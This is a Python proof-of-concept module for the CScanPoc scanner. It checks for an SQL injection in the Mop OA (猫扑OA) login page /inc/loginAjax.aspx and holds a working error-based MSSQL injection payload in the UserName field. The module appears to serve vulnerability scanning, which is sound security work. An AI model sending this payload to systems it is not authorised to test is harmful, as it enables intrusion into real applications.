# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Mop_0006'  # 平台漏洞编号，留空
    name = '猫扑OA登陆 SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-05-22'  # 漏洞公布时间
    desc = '''
        猫扑OA采用行业领先的云计算技术，基于传统互联网和移动互联网，创新云服务+云终端的应用模式， 为企业用户版提供一账号管理聚合应用服务。
        猫扑OA /inc/loginAjax.aspx 页面存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0112881'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '猫扑OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ec12d234-b35c-4ab1-ba1d-a0aaddc85c9d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # Refer:WooYun-2015-0112881
            uri = "/inc/loginAjax.aspx"
            payload = "UserName=test'%20AND%209709=CONVERT(INT,CHAR(113)%2bCHAR(115)%2bCHAR(111)%2bCHAR(100)%2bCHAR(115)%2bCHAR(115)%2bCHAR(115)%2bCHAR(115)) AND 'test'='test&Pwd=test&Os=Windows&Browser=Firefox"
            url = self.target + uri
            code, head, body, errcode, _url = hh.http(
                url, post=payload, proxy=('127.0.0.1', 8080))
            if code == 200 and 'qsodssss' in body:
                # security_hole("SQL-Injection:"+url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
